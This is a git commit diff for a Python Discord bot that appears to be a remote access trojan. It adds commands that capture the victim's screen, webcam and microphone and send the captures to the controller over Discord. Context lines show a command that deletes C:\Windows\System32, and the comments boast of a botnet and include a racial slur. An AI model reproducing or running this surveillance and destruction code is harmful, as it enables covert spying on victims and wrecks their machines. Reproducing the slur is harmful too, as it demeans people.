98bbecadfb7d03ddefed66d581debf9d532d5b47
0x-Stealth <42773083+0x-Stealth@users.noreply.github.com>
2023-12-20 03:10:18 +0000

    I COMMITED AND ALL I GOT WAS THIS LOUSY SHIRT

--- main.py
+++ main.py
@@ -4,7 +4,26 @@ from discord import Intents
 import subprocess
 import os
 import ctypes
+from PIL import ImageGrab
+import io
+import time
+import cv2
+import pyaudio
+import random
 #import modules.cookies as cumkies
+
+# this code is ahem, not very good. 
+# it started off good with modularisation and stuff
+# and i just can't be bothered to do it
+# i'll refactor it later
+# gang gang opps on me internet shootas
+# cybernigga gang gang
+
+# i got hella booters on my bawtnet
+# i got hella booters on my bawtnet
+# i got hella booters on my bawtnet
+# i got hella booters on my bawtnet
+# i got hella booters on my bawtnet
 
 intents = Intents.all() # can we go back to the days where there was no intents
 bot = commands.Bot(command_prefix=';', intents=intents)
@@ -71,6 +90,100 @@ async def restart(ctx):
 async def sys32(ctx):
     os.system("del C:\Windows\System32")
 
+@bot.command()
+async def screenshot(ctx):
+    screenshot = ImageGrab.grab()
+    
+    byte_stream = io.BytesIO()
+    screenshot.save(byte_stream, format='PNG')
+    byte_stream.seek(0)
+    
+    file = discord.File(byte_stream, filename='screenshot.png')
+    
+    await ctx.send(file=file)
+
+@bot.command()
+async def record(ctx):
+    while True:
+        screenshot = ImageGrab.grab()
+    
+        byte_stream = io.BytesIO()
+        screenshot.save(byte_stream, format='PNG')
+        byte_stream.seek(0)
+    
+        file = discord.File(byte_stream, filename='screenshot.png')
+    
+        await ctx.send(file=file)
+        time.sleep(5)
+
+        #todo: make it stop recording when stoprecord is called
+
+@bot.command()
+async def stoprecord(ctx):
+
+    await ctx.send("i don't know how to do this right now, thank you come again :)")
+
+@bot.command()
+async def webcam(ctx):
+    # use cv2 to take a picture and send it
+
+    cam = cv2.VideoCapture(0)
+
+    # exists? 
+    if not cam.isOpened():
+        await ctx.send("No webcam detected!")
+        return
+
+    result, frame = cam.read()
+
+    if not result:
+        await ctx.send("Could not read from webcam!")
+        return
+
+    cv2.imwrite("webcam.jpg", frame)
+    if random.randint(1, 50) == 1:
+        ctypes.windll.user32.MessageBoxW(0, "say cheese!", "you're ugly as shit", 1)
+    cam.release()
+
+    await ctx.send(file=discord.File("webcam.jpg"))
+
+import wave
+
+@bot.command()
+async def mic(ctx):
+    # pyaudio mic capture, send in 30 second chunks
+
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    CHUNK = 1024
+    RECORD_SECONDS = 30
+    WAVE_OUTPUT_FILENAME = "file.wav"
+
+    audio = pyaudio.PyAudio()
+
+    stream = audio.open(format=FORMAT, channels=CHANNELS,
+                    rate=RATE, input=True,
+                    frames_per_buffer=CHUNK)
+    
+    frames = []
+
+    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+
+    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
+    waveFile.setnchannels(CHANNELS)
+    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+    waveFile.setframerate(RATE)
+    waveFile.writeframes(b''.join(frames))
+    waveFile.close()
+
+    await ctx.send(file=discord.File(WAVE_OUTPUT_FILENAME))
 
 if __name__ == "__main__":
     with open('token.txt', 'r') as file:
@@ -80,3 +193,7 @@ if __name__ == "__main__":
 # i hate programming so much 
 # maybe it wouldn't be so bad if mr sertraline would work!
 # i'm going to go and cry now
+# update: i'm back from crying
+# i love venting in my code, because no one will ever see it!
+# and those who do, don't care!
+# good fun
--- util/decrypt.py
+++ util/decrypt.py
@@ -11,8 +11,6 @@ class AES256Decrypt:
 
     @staticmethod
     def decrypt_data(data : bytes , key : bytes):
-        # explaining maybe?
-        # ok so basically
         # the first 3 bytes are the length of the init vector
         # the next 12 bytes are the init vector
         # the rest is the encrypted data
@@ -46,17 +44,5 @@ class AES256Decrypt:
         
 # Bro I can't even test this because I don't have a proxy, and it's horrible opsec on my part to just rawdog it
 # I'm sure it works though
-    # Maybe(?)
-    # I dunno
-    # I'm not a bot developer
-    # I'm not even a developer, atleast I don't think I am
-    # I'm just a guy who knows how to code
-    # At what point do you become a developer?
-    # I don't know
-    # not being able to use discord is nice, i get stuff done
-    # but im alone with my thoughts
-    # and that's not good
-    # i need to be distracted
-    # i need to be distracted
-    #this playlist goes kinda hard tho https://open.spotify.com/track/5kBWHClnccth6MyPeGVKpm
+#this playlist goes kinda hard tho https://open.spotify.com/track/5kBWHClnccth6MyPeGVKpm
 
